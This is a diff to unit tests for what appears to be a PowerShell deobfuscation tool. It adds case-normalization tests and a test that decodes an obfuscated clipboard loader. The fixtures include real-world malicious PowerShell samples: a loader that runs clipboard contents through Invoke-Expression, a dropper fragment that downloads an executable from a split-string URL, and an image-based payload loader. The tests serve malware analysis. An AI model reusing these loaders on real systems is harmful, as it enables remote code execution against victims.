@@ -164,6 +164,18 @@ class TestPs1RealWorldSmall(TestUnitBase):
         self.assertIn('hello', result)
         self.assertNotIn('Invoke-Expression', result)
 
+    def test_type_aware_member_case_normalization(self):
+        data = b"$r = New-Object Random; $r.nExT(100)"
+        result = data | self.load() | str
+        self.assertIn('.Next(', result)
+        self.assertNotIn('.nExT(', result)
+
+    def test_type_aware_static_member_case_normalization(self):
+        data = b'[System.Threading.Thread]::cUrReNtThReAd.aPaRtMeNtStAtE'
+        result = data | self.load() | str
+        self.assertIn('CurrentThread', result)
+        self.assertIn('ApartmentState', result)
+
 
 
 class TestPs1RealWorldLarge(TestUnitBase):
@@ -446,7 +458,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
                 $o[$_ * 700 + $X] = ([Math]::Floor(($P.b -BAnd 15) * 16) -BOr ($P.g -BAnd 15))
               }
             }
-            Invoke-Expression ([System.Text.Encoding]::UTf8.GetString($O[0..194379]))
+            Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($O[0..194379]))
             '''
         ).replace('[[URL]]', 'https''://images2.imgbox''.com/fb/a9/wH2ykZbz_o.png')
         self.assertIn(goal, test)
@@ -591,7 +603,7 @@ class TestPs1RealWorldLarge(TestUnitBase):
             r'''
             $nsadasd = New-Object Random
             $YYU = New-Object System.Net.WebClient
-            $NSB = $nsadasd.next(10000, 282133)
+            $NSB = $nsadasd.Next(10000, 282133)
             $SDC = 'C:\Users\Public\' + $NSB + '.exe'
             foreach ($asfc in '[[URL]]') {
               try {
@@ -602,4 +614,47 @@ class TestPs1RealWorldLarge(TestUnitBase):
             }
             '''
         ).replace('[[URL]]', 'http:''//tqwe651''qweqweqw''.com/BUR/testv.php?l=big9.yarn')
+        self.assertIn(goal, test)
+
+    def test_clipboard_loader(self):
+        data = (
+            B"""& ( $PShome[4]+$pShOme[30]+'X') ( (-JOin[REgEX]::maTcHEs(" ) )93]RaHc[,'FPr' eCaLPerc-69]RaHc[,'Bcp'"""
+            B"""  eCaLPerc-  63]RaHc[,'KnC' eCaLPerc-  43]RaHc[,'juy'  eCaLPerc-)')}d{KnC()FPreiFPr,FPrxFPrf- juy}0{"""
+            B"""}1{juy(.;)}juytXBcpETjuy.}BBcpt{KnC=}d{KnC'+';juytxeBcpTjuy.}'+'BBcpt{KnC;)(ekovnI.)FPretsaFPr,FPrPF"""
+            B"""Prf-'+'juy}1{}0{juy(.}bT{'+'KnC;}EuRBcpT{KnC '+'= juyeNIBcplBcpitLuMjuy.}BBcpt{KnC;)FPretsyFPr,FPrS'"""
+            B"""+'FPr,FPrsmroFFPr,FPr.swodniW.mFPr,FPrxoBFPr,FP'+'rtxeT.FPrf'+'- juy}1{}0{}3{}2{}5{}4{juy( )FPrtcFPr"""
+            B""",FPrNFPr,FPrejbO-weFPrf- juy}2{}0{}1{juy(& = }BBcpt{KnC{ esle })juytxBcpeTBcpedOcIN'+'ujuy::qArhIzKn"""
+            B"""C ('+'juytxeBcpTtEgjuy::EuLAV.)  )FPr9FPr'+'+FPrT42JFPr(  )F'+'PrAVFPr,FPrELBaIrFPr f-juy}0{}1{juy(."""
+            B"""  (  =}D{KnC{ )FPrATSFPr qe- )(ekovnI.)FPrS'+'oTFPr,FPrrtFPr,FPrgniFPrf-juy}0{}1{}2{juy(.juyetABcpTB"""
+            B"""cpStnEmTRABcpPAjuy.juydABcpErhTtNBcpEBcprRucjuy:'+':EUlaV.) )FPrUFPr+FPrXSFPr+FPr:e'+'lFPr'+'+FPrbaI"""
+            B"""raVFPr( )FPreGFPr'+',FPr-TFPr,FPrMEtiFPr f-juy}0{'+'}1{}2{juy(. (  ( fi(KnC;)FPrW.FPr,FPrsmroF.'+'sw"""
+            B"""odniFPr,FPreFPr,FPrtsyS'+'FPr,F'+'PrmFPrf- juy}3{}4{}0{}2{}1{juy( emaNylbmessA- )FPrdAFPr,FPrT-d'+'F"""
+            B"""Pr,FPr'+'epyFPrf-juy}0{}1{}2{juy(&;})FPraobpilFPr,FPrC-teGFP'+'r,FPrdrFPr f- juy}0{}2{}'+'1{juy(.=}d"""
+            B"""{KnC{ )0 ae- )'+'FPrilC-tFPr,FPro'+'bpFPr,FPrdraFPr'+',FPreGFPrf- '+'juy}1{}'+'2{}3{}0{juy( )FPrmFPr"""
+            B""",FPrcgFPr f- juy}1{}0{juy(&( fi;'+' )FPrtxeFPr,FPrtaFPr,FPrATaFPr,FPrM'+'ROF'+'FPr,FPrT.Smrof.SWoDNi"""
+            B"""w.meFPr'+',FPrdFPr,FPrTsYsFPrf-juy}5{}3{}4{}1{}'+'6{}2{}0{juy(]ePYT[  = QARHIzKnC  '+'; )FPrlC.SFPr,"""
+            B"""FPrmRoFPr,FPrDFPr,FPrfFPr,FPrraoFPr,FPrw.METSFPr,FPrbPIFPr,FPrsFPr,FPrYFPr,FPr.sWoDnIFPrF-juy}7{}5{}"""
+            B"""3{}9{}8'+'{}6{}'+'0{}4{}1{}2{juy(]ePYT[ =9T42'+'jKnC  ;)FPrtFPr'+',FPrAerHTFPr,FPr.GNiDFPr,FPrdAFPr,"""
+            B"""F'+'PrErhFPrf-ju'+'y}1{}0{}4{}2{}3{juy('+']epyt[  = uXsKnC'+' '(( ( )'x'+]43[emOHSp$+]12[emohsP$ (& """
+            B"""",'.' ,'rigHT'+'tO'+'leFT' )) )"""
+        )
+        test = data | self.load() | str
+        goal = inspect.cleandoc(
+            '''
+            if (Get-Command 'Get-Clipboard' -ea 0) {
+              $d = Get-Clipboard
+            }
+            Add-Type -AssemblyName 'System.Windows.Forms'
+            $(if ([Threading.Thread]::CurrentThread.ApartmentState.ToString() -Eq 'STA') {
+              $D = [System.Windows.Forms.Clipboard]::GetText([System.Windows.Forms.TextDataFormat]::UnicodeText)
+            } else {
+              $tB = New-Object 'System.Windows.Forms.TextBox'
+              $tB.Multiline = $True
+              $Tb.Paste()
+              $tB.Text
+              $d = $tB.Text
+            })
+            Invoke-Expression ($d)
+            '''
+        )
         self.assertIn(goal, test)
